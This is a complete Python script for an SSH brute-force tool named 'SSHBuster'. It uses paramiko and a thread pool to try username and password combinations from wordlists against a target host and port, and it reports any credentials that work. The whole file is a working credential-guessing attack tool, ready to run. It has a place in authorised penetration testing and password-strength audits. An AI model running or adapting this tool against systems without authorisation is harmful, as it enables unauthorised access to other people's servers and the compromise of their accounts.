#!/usr/bin/env python3

import paramiko
import argparse
import concurrent.futures
import threading
import time
import sys

found_event = threading.Event()
lock = threading.Lock()

print("\033[93m")
print(r"""
   _____ _____ _    _ ____            _            
  / ____/ ____| |  | |  _ \          | |           
 | (___| (___ | |__| | |_) |_   _ ___| |_ ___ _ __ 
  \___ \\___ \|  __  |  _ <| | | / __| __/ _ \ '__|
  ____) |___) | |  | | |_) | |_| \__ \ ||  __/ |   
 |_____/_____/|_|  |_|____/ \__,_|___/\__\___|_|   
                                                                                                    
                                Developer: Sreeraj                                                                                             
""")
print("\033[92m  * GitHub: https://github.com/s-r-e-e-r-a-j\033[0m\n")


def read_lines(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except UnicodeDecodeError:
        with open(filepath, 'r', encoding='latin-1') as f:
            return [line.strip() for line in f if line.strip()]


def try_credentials(target_ip, target_port, username, password):
    if found_event.is_set():
        return None

    with lock:
        print(f"\033[94m[~] Trying: {username}:{password}\033[0m")

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=target_ip,
            port=target_port,
            username=username,
            password=password,
            timeout=3,
            allow_agent=False,
            look_for_keys=False
        )
        found_event.set()
        with lock:
            print(f"\n\033[92m[+] Found! Username: {username}, Password: {password}\033[0m\n")
        return (username, password)
    except paramiko.AuthenticationException:
        pass
    except Exception as e:
        with lock:
            if not found_event.is_set():
                print(f"\033[91m[!] Error with {username}:{password} -> {e}\033[0m")
    finally:
        try:
            client.close()
        except:
            pass
    return None


def brute_force(target_ip, target_port, usernames, passwords, threads):
    from itertools import product
    combo_gen = product(usernames, passwords)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = set()
        try:
            for u, p in combo_gen:
                if found_event.is_set():
                    break
                
                while len(futures) >= threads:
                    done, futures = concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)
                    for d in done:
                        result = d.result()
                        if result:
                            found_event.set()
                            return result

                futures.add(executor.submit(try_credentials, target_ip, target_port, u, p))

            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    found_event.set()
                    return result
        except KeyboardInterrupt:
            found_event.set()
            print("\n\033[91m[!] Interrupted by user.\033[0m")

    return None


def main():
    parser = argparse.ArgumentParser(description="Fast SSH Brute Forcer by Sreeraj")
    parser.add_argument("target_ip", help="Target SSH IP address")
    parser.add_argument("target_port", type=int, help="Target SSH port")
    parser.add_argument("-u", "--username", help="Single username")
    parser.add_argument("-U", "--userlist", help="Username wordlist")
    parser.add_argument("-p", "--password", help="Single password")
    parser.add_argument("-P", "--passlist", help="Password wordlist")
    parser.add_argument("-t", "--threads", type=int, default=2, help="Threads (max 5)")
    args = parser.parse_args()

    if not (args.username or args.userlist):
        print("[-] Please provide -u or -U.")
        sys.exit(1)
    if not (args.password or args.passlist):
        print("[-] Please provide -p or -P.")
        sys.exit(1)

    threads = min(args.threads, 5)
    usernames = [args.username] if args.username else read_lines(args.userlist)
    passwords = [args.password] if args.password else read_lines(args.passlist)

    result = brute_force(args.target_ip, args.target_port, usernames, passwords, threads)

    if not result:
        print("\033[93m[-] No valid credentials found.\033[0m")


if __name__ == "__main__":
    main()
